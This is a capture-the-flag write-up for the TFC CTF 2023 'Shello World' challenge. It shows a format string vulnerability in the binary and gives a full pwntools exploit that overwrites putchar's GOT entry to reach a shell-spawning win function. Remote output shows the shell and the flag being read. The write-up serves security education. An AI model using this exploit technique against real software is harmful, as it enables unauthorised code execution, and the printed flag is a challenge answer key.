# Shello World

## Description

By `tomadimitrie`

Greetings, traveler

Downloads: [shello-world](https://drive.google.com/file/d/1RgtCUXAhcxKZVxU4c4-qQtqSj0IpiSYa/view?usp=sharing)

## Solution

Basic file checks:
```bash
└─$ file ./shello-world
./shello-world: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=aa4c6aefb0f95c567829d1cde4be082c92c490a9, for GNU/Linux 3.2.0, not stripped

└─$ checksec ./shello-world
[*] '/home/kali/Desktop/TFC-CTF-2023/SHELLO-WORLD/shello-world'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled         # No Shellcode This Time
    PIE:      No PIE (0x400000)
```      

Vuln function (from Ghidra) :

```c
void vuln(void) {
  ... 
  <unused local varaibles>
  ...
  fgets((char *)&local_108,0x100,stdin); // User Input
  printf("Hello, ");
  printf((char *)&local_108);            // Echo Input
  putchar(10);                           // Put Newline
  return;
}
```

The attack vector is to use [Format String Vulnerability](https://ir0nstone.gitbook.io/notes/types/stack/format-string). The approach I ended up using was to overwrite address in GOT (Global Offset Table) with different address to reach   `win` function.

I was struggling to make the payload work, ended up watching full tutorial for pwntools from [pwncollege](https://youtu.be/dX7kguNt20M) D:

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

exe = './shello-world'
elf = context.binary = ELF(exe)
context.log_level = 'INFO' # 'DEBUG'

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2])
    else:
        return process([exe] + argv, *a, **kw)


#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def find_offset(payload):
    p = process(exe)
    p.sendline(payload)
    resp = p.recvall()
    p.close()
    return resp

def get_shell(payload):
    io.sendline(payload)

io = start()

# Pwntools lets us find Format String Vulnaribility offset
# You need to tell it what to do, so it can find the offset
# Offset can differ from program to program
# Example manual payload: AAAABBBB%OFFSET$p
fmtstr = FmtStr(execute_fmt=find_offset)

# With this payload we need to get shell
# "win" function executes system call and `find_offset` will crash due to EOF
fmtstr = FmtStr(execute_fmt=get_shell, offset=fmtstr.offset)
# Overwrite `putchar` with `win` function
fmtstr.write(elf.got.putchar, elf.functions.win)
# Send payload 
fmtstr.execute_writes()

# Get shell
io.interactive()
```

```bash
└─$ py solve.py REMOTE challs.tfcctf.com 31637 
[+] Opening connection to challs.tfcctf.com on port 31637: Done
...
[*] Found format string offset: 6 
[*] Switching to interactive mode
Hello,                                                                                                                      \xc0                                                                                                                                                          \x00                                              7aaaid
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ ls # Above command is `id`. Hard to see because of payload size
flag.txt
shello-world
$ cat flag.txt
TFCCTF{ab45ed10bb240fe11c5552d3db6776f708c650253755e706268b45f3aae6d925}       
```
::: tip Flag
`TFCCTF{ab45ed10bb240fe11c5552d3db6776f708c650253755e706268b45f3aae6d925}      `
:::
::: info :information_source:
For some reason overwriting `printf` wasn't working...
:::